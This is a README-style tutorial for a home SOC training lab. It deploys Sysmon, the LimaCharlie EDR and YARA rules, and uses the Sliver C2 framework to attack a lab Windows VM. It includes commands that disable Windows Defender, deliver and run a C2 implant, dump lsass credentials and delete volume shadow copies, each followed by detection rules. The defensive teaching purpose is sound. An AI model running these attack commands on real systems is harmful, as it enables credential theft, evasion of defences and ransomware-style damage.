# SOC-MOCK
![Image](.png)
## Objective 
This project aimed to build a realistic Security Operations Center (SOC) training environment focusing on practical skills for detecting and responding to cyber threats.
- Advanced threat detection tools like Sysmon and LimaCharlie EDR were deployed for real-time analysis
- Adversary techniques were simulated, and threat responses were automated to stay ahead of potential risks
- YARA rules were integrated to enhance malware detection capabilities
<br><br>

## Components

- **VirtualBox**: Used for creating and managing virtual machines
- **Ubuntu Server VM**: Used to deploy the Sliver C2 framework, which acts as a simulated attacker tool
- **Windows VM**: Used as victim endpoint device
- **LimaCharlie EDR**: An EDR platform used to collect, analyze logs and investigate telemetry from the Windows VM
- **Sliver C2**: A simulated attacker tool used to create a Command & Control (C2) server on the Ubuntu VM
- **YARA Rules**: Specific sets of instructions used to identify malware based on patterns
- **Sysmon**: Windows system service used to monitor and log system activity to the event log
- **VirusTotal**: A service for analyzing suspicious files and URLs for malware
- **NAT Network**: Configured in VirtualBox for network simulation

<details>
  <summary><h2><b>Section 1: Setting up the Virtual Environment</b></h2></summary>
  This section will guide through the setup of virtual environment using VirtualBox (If you want you, can use VMware as well). Configure a NAT network and install two virtual machines – one for Ubuntu Server and another for a Windows 10. <br><br>

   **1: Download and setup Virtualbox**:  
    You can download Virtualbox from here. Setup is pretty straightforward
    <br><br>
   **2: Create a New VM for Windows 10**:  
   Next, set up a new virtual machine in VirtualBox for Windows 10.
  - **Create it with following minimum specs:**
   - RAM: Approx 2 GB
   - Processors: 2 CPU cores
   - Hard Disk Storage: 50 GB
    <br><br>
    
   **3: Create a New VM for Ubuntu Server**:  
    Now, set up a new virtual machine in VirtualBox for Ubuntu Server.
  - **Create it with following minimum specs:**
   - RAM: Approx 2 GB
   - Processors: 2 CPU cores
   - Hard Disk Storage: 20 GB
   - During OS install, **leave defaults as is**
  ![Image](https://imgur.com/GDfOZmg.png)
    <br><br>
  - After installation it should look like this:
  ![Image](https://imgur.com/9VNGxVp.png)
    <br><br>
       
   **4: Configure Windows VM**:  
    Permanently disable Microsoft Defender so it doesn’t interfere with the fun stuff we’re planning. This is pretty tricky (especially in Windows 11) as Defender will turn itself back on.
1. Disable Tamper Protection
  - Go to "Windows Security"
  - Click “Virus & threat protection”
  - Under “Virus & threat protection settings” click “Manage settings”
  - Toggle OFF the “Tamper Protection” switch. When prompted, click “Yes”
![Image](https://imgur.com/iTuPTwi.png)
  - Toggle every other option OFF as well
2. Permanently Disable Defender via Group Policy Editor
  - Click the “Start” menu icon
  - Type “cmd” into the search bar within the Start Menu
  - Right+Click “Command Prompt” and click “Run as administrator”
  - Run the following command
```
gpedit.msc
```
  - Inside the Local Group Policy Editor
  - Click Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
  - Double-click “Turn off Microsoft Defender Antivirus”
  - Select “Enabled” (If you enable this policy setting, Defender doesn't run, and will not scan for malware or other potentially unwanted software)
  - Click "Apply"
![Image](https://imgur.com/9bsP5Lf.png)
3. Permanently Disable Defender via Registry
  - From the same administrative cmd, copy/paste this command and press Enter
<br>

```
REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

</br>

4. Prepare to boot into Safe Mode to disable all Defender services
  - Click the “Start” menu icon
  - Type “msconfig” into the search bar
  - Go to “Boot” tab and select “Boot Options”
  - Check the box for “Safe boot” and “Minimal”
![Image](https://imgur.com/0K1OBWq.png)
  - Click Apply and OK
  - System will restart into Safe Mode

5. Now, in Safe Mode, we’ll disable some services via the Registry
  - Press the “Win + R"
  - Type “regedit” into the search bar and hit Enter
  - For each of the following registry locations, browse to the key, find the “Start” value, and change it to "4"
![Image](https://imgur.com/IWskQZt.png)
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
  - Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter

6. Leave Safe Mode the same way we got into it
  - Uncheck the box for “Safe boot”
  - System will restart into normal desktop environment, hopefully Defender-free
    <br><br>
</details>

<details>
  <summary><h2><b>Section 2: Install Sysmon in Windows VM</b></h2></summary>

This is actually optional in this project, but it’s a must-have analyst tool for getting very granular telemetry on your Windows endpoint. You can read more about it
[here](https://www.learn.microsoft.com/en-us/sysinternals/downloads/sysmon/). 

1. **Launch an Administrative PowerShell console for the following commands:**

- Click the “Start” menu icon
- Type “Powershell” into the search bar within the Start Menu
- Click “Windows PowerShell” and click “Run as administrator”

2. **Download Sysmon with the following command:**
```
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
3. **Unzip sysmon.zip**
```
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
4. **Download SwiftOnSecurity’s Sysmon config**
```
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
5. **Install Sysmon with Swift’s config**
```
C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
![Image](https://imgur.com/eUuEwgD.png)

6. **Check Sysmon64 service is installed and running**
```
Get-Service sysmon64
```
7. **Check for the presence of Sysmon Event Logs**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```
  <br><br>
</details>

<details>
  <summary><h2><b>Section 3: Install LimaCharlie EDR on Windows VM</b></h2></summary>

  [LimaCharlie](https://www.limacharlie.io/) 
  is a very powerful SecOps Cloud Platform. It not only comes with a cross-platform EDR agent, but also handles all of the log shipping/ingestion and has a threat detection engine. In free version you can create for up to two systems which is great for projects like this.

1. **Create a free LimaCharlie account**
- LimaCharlie will ask you a few questions about your role. Answer however you like.

2. **Create an organization**

Name: *Anything*

Data Residency Region: *Closest to you*

Demo Configuration Enabled: *Disabled*

Template: *Extended Detection & Response Standard*
![Image](https://imgur.com/T1INyuQ.png)

3. **Click "Add a Sensor"**

- Select Windows
- Provide a description such as: Windows VM - Lab
- Click Create
- Select the Installation Key we just created
![Image](https://imgur.com/ba1VqUg.png)
- Select the "x86-64 (.exe)" sensor
![Image](https://imgur.com/mP2CI8j.png)



- In Windows VM, open an Administrative PowerShell and paste the following commands:
```
cd C:\Users\User\Downloads
```
```
Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
```
![Image](https://imgur.com/LGFmfRt.png)
- Shift into a standard admin cmd

- Copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.
![Image](https://imgur.com/D0UvIR4.png)

- If everything worked correctly, in the LimaCharlie web UI you should see the sensor reporting in


4. **Configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry**

- In the left-side menu, click “Artifact Collection”
- Next to “Artifact Collection Rules” click “Add Rule”
```
Name: windows-sysmon-logs
Platforms: Windows
Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*
Retention Period: 10
```
- Click “Save Rule”
![Image](https://imgur.com/VgxX27Q.png)

LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.

The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.

> Now would be a good time to Snapshot your Windows VM
</details>

<details>
  <summary><h2><b>Section 4: Setup Attack System </b></h2></summary>
  I recommend using an SSH client to access the Ubuntu VM so that you can easily copy/paste commands.

1. **Open your CLI**

```
ssh username@[Linux_VM_IP]
```

2. **Now, from within this new SSH session, proceed with the following instructions to setup our attacker C2 server. First, gain access to the root shell to make life easier.**

```
sudo su
```

3. **Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.**

- Download Sliver Linux server binary
```
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
```
- Make it executable
```
chmod +x /usr/local/bin/sliver-server
```
- install mingw-w64 for additional capabilities
```
apt install -y mingw-w64
```
- Create our future working directory
```
mkdir -p /opt/sliver
```
![Image](https://imgur.com/LCfhKok.png)

> Explore the LimaCharlie web interface to learn more about what it can do!
</details>
<details>
  <summary><h2><b>Section 5: Generate the Command & Control payload </b></h2></summary>
  Either from your SSH session or directly from your Ubuntu Server, take the following actions:
  <br></br>

  1. **Access root shell and change dir to Sliver install**

```
sudo su
cd /opt/sliver
```

  2. **Launch Sliver server**

```
sliver-server
```
![Image](https://imgur.com/8DsuXyT.png)
  3. **Generate C2 session payload. Use your Linux VM’s IP address**
```
generate --http [Linux_VM_IP] --save /opt/sliver
```
![Image](https://imgur.com/EN108X6.png)
  4. **Confirm the new implant configuration**
```
implants
```
  5. **Now we have a C2 payload we can drop onto our Windows VM. Exit Sliver for now.**
```
exit
```

  6. **To easily download the C2 payload from the Linux VM to the Windows VM, use this python trick that spins up a temp web server**
```
cd /opt/sliver
python3 -m http.server 80
```
![Image](https://imgur.com/gQG90re.png)
  7. **Switch to the Windows VM and launch an Admin PowerShell console to download the implant from Ubuntu server**
```
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```
![Image](https://imgur.com/iU5lry0.png)
> Now would be a good time to snapshot your Windows VM, before we execute the malware.

</details>
<details>
  <summary><h2><b>Section 6: Start Command & Control Session  </b></h2></summary>

1. **Now that the payload is on the Windows VM, switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback**

- Terminate the python web server by pressing "Ctrl + C"
- Now, relaunch Sliver
```
sliver-server
```
- Start the Sliver HTTP listener
```
http
```
![Image](https://imgur.com/2RqMkmX.png)
- If you get an error starting the HTTP listener, reboot the VM

2. **Return to the Windows VM and execute the C2 payload from its download location using the same admin PowerShell prompt**
```
C:\Users\User\Downloads\<your_C2-implant>.exe
```
![Image](https://imgur.com/N8Z5Xo1.png)
3. **Within a few moments, you should see your session check in on the Sliver server**
![Image](https://imgur.com/1Rs38Xn.png)
4. **Verify your session in Sliver, and note its Session ID**
```
sessions
```
5. **To interact with your new C2 session, type the following command into the Sliver shell**
```
use [session_id]
```

> c0ngratulations! you pwned your Windows VM
6. **Now, run a few basic commands**

- To get info about the session
```
info
```
- Find out the user and learn his privileges
```
whoami
```
![Image](https://imgur.com/IO9bJZi.png)
```
getprivs
```
![Image](https://imgur.com/Krpmh17.png)
> If your implant was properly run with Admin rights, you’ll notice you have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you don't see these privileges, make sure you ran the implant from an Admin command prompt
- Identify implant’s working dir
```
pwd
```
- Examine network connections occurring on the remote system
```
netstat
```
- Identify running processes on the remote system
```
ps -T
```
![Image](https://imgur.com/AIMklUP.png)
> Notice that Sliver highlights its own process in green and any defensive tools in red. This is how attackers become aware of what security products a victim system using.
  </details>

<details>
  <summary><h2><b>Section 7: Observe EDR Telemetry</b></h2></summary>

1. **Hop into the LimaCharlie web UI and check out some basic features**

- Click “Sensors” on left menu

- Click your active Windows sensor


- On the new left-side menu for this sensor, click “Processes”


> Explore what is returned in the process tree. Hover over some of the icons to see what they represent

![Image](https://imgur.com/GZ9FZm0.png)
Knowing common processes on a system is very important. As professionals say at SANS, *“you must know normal before you can find evil”* Check out this [“Hunt Evil”](https://www.sans.org/posters/hunt-evil/) poster from SANS.


2. **One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed**
- The C2 implant shows as not signed, and is also active on the network.

![Image](https://imgur.com/2frmDNQ.png)

- Notice how quickly we are able to identify the destination IP this process is communicating with.

3. **Now click the “Network” tab on the left-side menu**

- Explore what is returned in the network list. "Ctrl+F" to search for your implant name

4. **Now click the “File System” tab on the left-side menu**

- Browse to the location we know our implant to be running from

![Image](assets/3.gif)

5. **Inspect the hash of the suspicious executable by scanning it with VirusTotal**

> “*Item not found*” on VirusTotal doesn't mean that this file is innocent, it just might not that scanned before. This makes sense because you just generated this payload, so of course it’s not likely to be seen by VirusTotal before. So, if you already suspect a file to be possible malware, but VirusTotal has never seen it before, trust your instincts. This actually makes a file even more suspicious because nearly everything has been seen by VirusTotal, so your sample may have been custom-crafted/targeted.

6. **Click “Timeline” on the left-side menu of our sensor. This is a real-time view of EDR telemetry + event logs streaming from this system**

- Read about the various EDR events in the LimaCharlie docs.

- Filter your timeline with known IOCs (indicators of compromise) such as the name of your implant or the known C2 IP address

- If you scroll back far enough, should be able to find the moment your implant was created on the system, and when it was launched shortly after, and the network connections it created immediately after

![Image](https://imgur.com/pV7Z8qm.png)

7. **Examine the other events related to your implant process** 

- you’ll see it is responsible for other events such as “SENSITIVE_PROCESS_ACCESS” from when you enumerated your privileges in an earlier step. This particular event will be useful later on when you will craft your first detection rule

> I recommend spending more time exploring LimaCharlie telemetry to familiarize yourself not only with the known-bad events, but also the abundance of “normal” things happening on your “idle” Windows VM.

  </details>

<details>
  <summary><h2><b>Section 8: Wear the Black Hat  </b></h2></summary>

Go back into Sliver C2 session and do some shady stuff that you would be able to detect.

1. **Drop into a C2 session on your victim**

2. **Run the following commands within the Sliver session on your victim host**

- First, we need to check our privileges to make sure we can perform privileged actions on the host
```
getprivs
```
- A powerful command to check privilege for *SeDebugPrivilege* which opens the door for many things. If you’ve got that, we’re good. If you don’t, you need to relaunch your C2 implant with administrative rights

- Next, do something adversaries love to do for stealing credentials on a system — *dump the lsass.exe process from memory.* Read more about this technique [here](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/)
```
procdump -n lsass.exe -s lsass.dmp
```
This will dump the remote process from memory, and save it locally on your Sliver C2 server.

> NOTE: This will fail if you did not launch your C2 payload with admin rights on the Windows system. Even if it fails it will generate telemetry need.

2. **Now Let’s Detect It**

Now, switch over to LimaCharlie to find the relevant telemetry

- Since *lsass.exe* is a known sensitive process often targeted by credential dumping tools, any good EDR will generate events for this

- Go to "Timeline" of your Windows VM sensor and use the “Event Type Filters” to filter for “SENSITIVE_PROCESS_ACCESS” events.
There will likely be many of these, but pick any one of them as there isn’t much else on this system that will be legitimately accessing "lsass"
![Image](https://imgur.com/Su8gSsG.png)


- Now that we know what the event looks like when credential access occurred, we have what we need to craft a detection & response (D&R) rule that would alert anytime this activity occurs
![Image](https://imgur.com/mNWqOEt.png)
- Click the button in the screenshot to begin building a detection rule based on this event

- In the “Detect” section of the new rule, remove all contents and replace them with this
```
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```
![Image](https://imgur.com/oxRKaBy.png)
- We’re specifying that this detection should only look at *"SENSITIVE_PROCESS_ACCESS"* events where the victim or target process ends with "lsass.exe"

- In the “Respond” section of the new rule, remove all contents and replace them with this
```
action: report
name: LSASS access
```
- We’re telling LimaCharlie to simply generate a detection “report” anytime this detection occurs. We could ultimately tell this rule to do all sorts of things, like terminate process chain, etc.

- Now let’s test our rule against the event we built it for. Lucky for us, LimaCharlie carried over that event it provides a quick and easy way to test the D&R logic. Click “Target Event” below the D&R rule you just wrote. Here you will see the raw event we observed in the timeline earlier

- Scroll to the bottom of the raw event and click “Test Event” to see if our detection would work against this event.
![Image](https://imgur.com/W00C0rY.png)
- Notice that we have a “Match” and the D&R engine tells you exactly what it matched on.
![Image](https://imgur.com/mM1Vae5.png)

- Scroll back up and click “Save Rule” and give it the name “LSASS Accessed” and be sure it is enabled

3. **Return to your Sliver server console, back into your C2 session, and rerun same "procdump command"**

- After rerunning the procdump command, go to the “Detections” tab on the LimaCharlie main left-side menu.
![Image](https://imgur.com/buIAvmX.png)

> Congratulations! You’ve just detected a threat with your own detection signature! Expand a detection to see the raw event

![Image](https://imgur.com/FZFn6xt.png)

- Notice you can also go straight to the timeline where this event occurred by clicking “View Event Timeline” from the Detection entry
  </details>

  <details>
  <summary><h2><b>Section 9: Blocking Attacks</b></h2></summary>
Wouldn’t it be great if we could block the threat rather than just generate an alert?

Craft a rule that would be very effective at disrupting a ransomware attack by looking for a predictable action that ransomware tends to take: [Deletion of Volume Shadow Copies](https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/)

> Why This Rule? "Volume Shadow Copies" provide a convenient way to restore individual files or even an entire file system to a previous state which makes it a very attractive option for recovering from a ransomware attack. For this reason, it’s become very predictable that one of the first signs of an impending ransomware attack is the "deletion of volume shadow copies".

A basic command that would accomplish this
```
vssadmin delete shadows /all
```

1. **Get back into Sliver C2 shell**

> If you have issues reestablishing your HTTP listener, try rebooting your Ubuntu system

In your Sliver C2 shell on the victim, run this command:
```
shell
```
- When prompted with “This action is bad OPSEC, are you an adult?” type "Yes" if you are an adult, "No" if you are not :) and hit enter

In the new System shell, run the following command:
```
vssadmin delete shadows /all
```
- The output is not important as there may or not be Volume Shadow Copies available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need

Run this command to verify we still have an active system shell:
```
whoami
```
2. **Browse over to LimaCharlie’s detection tab to see if default Sigma rules picked up on our noise**
![Image](https://imgur.com/U0tHpxW.png)

- Click to expand the detection and examine all of the metadata contained within the detection itself. One of the great things about Sigma rules is they are enriched with references to help understand why the detection exists in the first place

- Click "View Event Timeline" to see the raw event that generated this detection
![Image](https://imgur.com/v8rFY9i.png)
- Craft a Detection & Response (D&R) rule from this event
![Image](https://imgur.com/Cjq9dBC.png)

From this D&R rule template, we can begin crafting our response action that will take place when this activity is observed. Add the following *"Response"* rule to the Respond section:
```
- action: report
  name: vss_deletion_kill_it
- action: task
  command:
    - deny_tree
    - <<routing/parent>>
```
- The “action: report” section simply creates a Detection report to the “Detections” tab

- The “action: task” section is what is responsible for killing the parent process responsible with "deny_tree" for the *vssadmin delete shadows /all command*

- Save your rule with the following name: vss_deletion_kill_it

3. **Test it**

Now return to Sliver C2 session, and rerun the command and see what happens.

Run the command to delete volume shadows:
```
vssadmin delete shadows /all
```
- The command should succeed, but the action of running the command is what will trigger our D&R rule
![Image](https://imgur.com/a4Dhfxc.png)

Now, to test if our D&R rule properly terminated the parent process, check to see if you still have an active system shell by rerunning the *"whoami"* command:
```
whoami
```
- If D&R rule worked successfully, the system shell will hang and fail to return anything from the *whoami* command, because the parent process was terminated


> Note, you also may receive output such as “Shell Exited” — this is functionally the same thing as it hanging and providing no output. This is effective because in a real ransomware scenario, the parent process is likely the ransomware payload or lateral movement tool that would be terminated in this case
  </details>

  <details>
  <summary><h2><b>Section 10: Automated YARA Scanning</b></h2></summary>
The goal of this section is to take advantage of a more advanced capability of any good EDR sensor, to automatically scan files or processes for the presence of malware based on a YARA signature.

> What is YARA? YARA is a tool primarily used for identifying and classifying malware based on textual or binary patterns. It allows researchers and security professionals to craft rules that describe unique characteristics of specific malware families or malicious behaviors. These rules can then be applied to files, processes, or even network traffic to detect potential threats. When analyzing a compromised system, YARA helps in filtering through large amounts of data to find malicious artifacts by matching them against a set of predefined rules. This ability to create customized detection signatures is particularly useful in threat hunting and incident response, enabling fast identification of known and even previously unknown malicious elements.

There are many free and open source YARA scanners and rulesets. You can read more about YARA from [VirusTotal](https://virustotal.github.io/yara/) or explore one of the many open source [YARA rulesets](https://github.com/Yara-Rules/rules).

Prepare LimaCharlie for detecting certain file system and process activities in order to trigger YARA scans.

1. **Add a YARA signature for the Sliver C2 payload**

Since we’re dealing with the Sliver C2 payload, we can be more targeted in by using a signature specifically looking for [Sliver](https://sliver.sh/docs?name=Getting+Started). I've used UK National Cyber Security Centre [publication](https://www.ncsc.gov.uk/files/Advisory%20Further%20TTPs%20associated%20with%20SVR%20cyber%20actors.pdf) on Sliver, including YARA signatures and other useful detections.

![Image](https://imgur.com/klrX5b4.png)
- Under “Automation” > “YARA Rules”, Click Add Yara Rule

![Image](https://imgur.com/UDm7nMA.png)
- Name the rule as "sliver"
- Copy and paste the contents from the code snippet of the YARA Rules section of the [publication](https://www.ncsc.gov.uk/files/Advisory%20Further%20TTPs%20associated%20with%20SVR%20cyber%20actors.pdf) into the Rule block
- Click “Save Rule”

Now create one more YARA rule with a name "sliver-process" and Copy/Paste this:
```
rule sliver_strings {
  meta:
    author = "You"
    description = "Detects Sliver Windows and Linux implants based on obvious strings"
  strings:
    $p1 = "/sliver/"
    $p2 = "sliverpb"
  condition:
    all of ($p*)
}
```

2. **Create D&R rules that will generate alerts whenever a YARA detection occurs**

- Go to “Automation” > “D&R Rules”

- Create a new rule

In the Detect block, paste the following:
```
event: YARA_DETECTION
op: and
rules:
  - not: true
    op: exists
    path: event/PROCESS/*
  - op: exists
    path: event/RULE_NAME
```
> Notice that we’re detecting on YARA detections not involving a PROCESS object, that’ll be its own rule shortly.

In the Respond block, paste the following:
```
- action: report
  name: YARA Detection {{ .event.RULE_NAME }}
- action: add tag
  tag: yara_detection
  ttl: 80000
```
- Save the rule and title it "YARA Detection"

Create another rule and in the Detect block, paste the following:
```
event: YARA_DETECTION
op: and
rules:
  - op: exists
    path: event/RULE_NAME
  - op: exists
    path: event/PROCESS/*
```
> Notice that this detection is looking for YARA Detections specifically involving a PROCESS object.

In the Respond block, paste the following:
```
- action: report
  name: YARA Detection in Memory {{ .event.RULE_NAME }}
- action: add tag
  tag: yara_detection_memory
  ttl: 80000
```
- Save the rule and title it "YARA Detection in Memory"

3. **Test the new YARA signature**

Since we already know we have a Sliver implant sitting in the Downloads folder of our Windows VM, we can easily test our signature by initiating a manual YARA scan using the EDR sensor.

- In LimaCharlie, browse to the “Sensors List” and click on our Windows VM sensor


Access the EDR Sensor Console which allows us to run sensor commands against this endpoint


Go to "Console" and run the following command to kick off a manual YARA scan of our Sliver payload:
```
yara_scan hive://yara/sliver -f C:\Users\User\Downloads\[payload_name].exe
```
> Replace [payload_name] with your actual payload name

![Image](https://imgur.com/SsFumfj.png)
- Hit enter
- Now, also confirm that you have a new Detection on the “Detections” screen

4. **Automatically YARA scan downloaded EXEs**

- Browse to “Automation” > “D&R Rules”
- Create a new rule

In the Detect block, paste the following:
```
event: NEW_DOCUMENT
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
  - op: ends with
    path: event/FILE_PATH
    value: .exe
```
> Notice that this detection is simply looking for NEW .exe files to appear in any users Downloads directory

In the Respond block, paste the following:
```
- action: report
  name: EXE dropped in Downloads directory
- action: task
  command: >-
    yara_scan hive://yara/sliver -f "{{ .event.FILE_PATH
    }}"
  investigation: Yara Scan Exe
  suppression:
    is_global: false
    keys:
      - '{{ .event.FILE_PATH }}'
      - Yara Scan Exe
    max_count: 1
    period: 1m
```
> This response action generates an alert for the EXE creation, but more importantly, kicks off a YARA scan using the Sliver signature against the newly created EXE.

- Save the rule and title it "YARA Scan Downloaded .exe"

5. **Automatically YARA scan processes launched from Downloads directory**

- Browse to “Automation” > “D&R Rules”
- Create a new rule

In the Detect block, paste the following:
```
event: NEW_PROCESS
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
```
> This rule is matching any process that is launched from a user Downloads directory

In the Respond block, paste the following:
```
- action: report
  name: Execution from Downloads directory
- action: task
  command: yara_scan hive://yara/sliver-process --pid "{{ .event.PROCESS_ID }}"
  investigation: Yara Scan Process
  suppression:
    is_global: false
    keys:
      - '{{ .event.PROCESS_ID }}'
      - Yara Scan Process
    max_count: 1
    period: 1m
```
> Notice in this rule, we’re no longer scanning the "FILE_PATH", but the actual running process by specifying its "PROCESS_ID". We are also now using "sliver-process" rule

- Save the rule and title it "YARA Scan Process Launched from Downloads"

6. **Trigger the new rules**

Scanning New EXEs in Downloads dir. You don't need to re-download Sliver payload, moving it another dir and putting back is enough to trigger.
![Image](https://imgur.com/FBU0KaI.png)
Run the following PowerShell command to move your Sliver payload from Downloads to Documents:
```
Move-Item -Path C:\Users\User\Downloads\[payload_name].exe -Destination C:\Users\User\Documents\[payload_name].exe
```
Now, put it back to generate the "NEW_DOCUMENT" event for an EXE being dropped into the Downloads folder
```
Move-Item -Path C:\Users\User\Documents\[payload_name].exe -Destination C:\Users\User\Downloads\[payload_name].exe
```
> Replace [payload_name] with your actual payload name

Head over to your Detections tab and see what happened. It may take a moment.
![Image](https://imgur.com/yN7iGRF.png)
- As you can see an initial alert for EXE dropped in Downloads directory followed shortly by a YARA detection once the scan kicked off and found Sliver inside the EXE

7. **Scanning processes launched from Downloads**

Now test "NEW_PROCESS" rule to scan running processes launched from Downloads dir.
![Image](https://imgur.com/dbznaGt.png)
- Launch an Administrative PowerShell prompt

First, check for any existing instances of Sliver C2 and kill it
```
Get-Process [payload_name] | Stop-Process
```
Execute your Sliver payload to create the "NEW_PROCESS" event we need to trigger the scanning of a process launched from the Downloads dir:
```
C:\Users\User\Downloads\[payload_name].exe
```
Head over to your Detections tab and see what happened!
![Image](https://imgur.com/ioH03cw.png)
- You should see an initial alert for Execution from Downloads directory followed shortly by a YARA detection in Memory once the scan kicked off and found Sliver inside the EXE
```
✄╔═╦╦═╦╦╗╔═╦═╦╦╦══╦╗╔╦═╦══╗╔══╦══╗
✄╚╗║║║║║║║╔╣╬║║║══╣╚╝║╦╩╗╗║╚║║╩╗╔╝
✄╔╩╗║║║║║║╚╣╗╣║╠══║╔╗║╩╦╩╝║╔║║╗║║
✄╚══╩═╩═╝╚═╩╩╩═╩══╩╝╚╩═╩══╝╚══╝╚╝
```
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─████████──████████─██████████████─██████──██████────██████──────────██████─██████████████─██████████─██████─────────██████████████─████████████──────██████████─██████████████─██████─
─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██────██░░██████████──██░░██─██░░░░░░░░░░██─██░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░████────██░░░░░░██─██░░░░░░░░░░██─██░░██─
─████░░██──██░░████─██░░██████░░██─██░░██──██░░██────██░░░░░░░░░░██──██░░██─██░░██████░░██─████░░████─██░░██─────────██░░██████████─██░░████░░░░██────████░░████─██████░░██████─██░░██─
───██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██────██░░██████░░██──██░░██─██░░██──██░░██───██░░██───██░░██─────────██░░██─────────██░░██──██░░██──────██░░██───────██░░██─────██░░██─
───████░░░░░░████───██░░██──██░░██─██░░██──██░░██────██░░██──██░░██──██░░██─██░░██████░░██───██░░██───██░░██─────────██░░██████████─██░░██──██░░██──────██░░██───────██░░██─────██░░██─
─────████░░████─────██░░██──██░░██─██░░██──██░░██────██░░██──██░░██──██░░██─██░░░░░░░░░░██───██░░██───██░░██─────────██░░░░░░░░░░██─██░░██──██░░██──────██░░██───────██░░██─────██░░██─
───────██░░██───────██░░██──██░░██─██░░██──██░░██────██░░██──██░░██──██░░██─██░░██████░░██───██░░██───██░░██─────────██░░██████████─██░░██──██░░██──────██░░██───────██░░██─────██████─
───────██░░██───────██░░██──██░░██─██░░██──██░░██────██░░██──██░░██████░░██─██░░██──██░░██───██░░██───██░░██─────────██░░██─────────██░░██──██░░██──────██░░██───────██░░██────────────
───────██░░██───────██░░██████░░██─██░░██████░░██────██░░██──██░░░░░░░░░░██─██░░██──██░░██─████░░████─██░░██████████─██░░██████████─██░░████░░░░██────████░░████─────██░░██─────██████─
───────██░░██───────██░░░░░░░░░░██─██░░░░░░░░░░██────██░░██──██████████░░██─██░░██──██░░██─██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░████────██░░░░░░██─────██░░██─────██░░██─
───────██████───────██████████████─██████████████────██████──────────██████─██████──██████─██████████─██████████████─██████████████─████████████──────██████████─────██████─────██████─
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
```
░▀▄─────▄▀░▐█▀▀█▌░█░█──░██▄─░█▌─░▄█▀▄─░▐██░██───░▐█▀▀░▐█▀█▄──░▐██░█▀█▀█░█ 
──░▀▄─▄▀──░▐█▄░█▌░█░█──░▐█░█░█─░▐█▄▄▐█─░█▌░██───░▐█▀▀░▐█▌▐█───░█▌──░█───▀ 
────░█────░▐██▄█▌░▀▄▀──░██─░██▌░▐█─░▐█░▐██░██▄▄█░▐█▄▄░▐█▄█▀──░▐██─░▄█▄─░▄ 

```
  </details>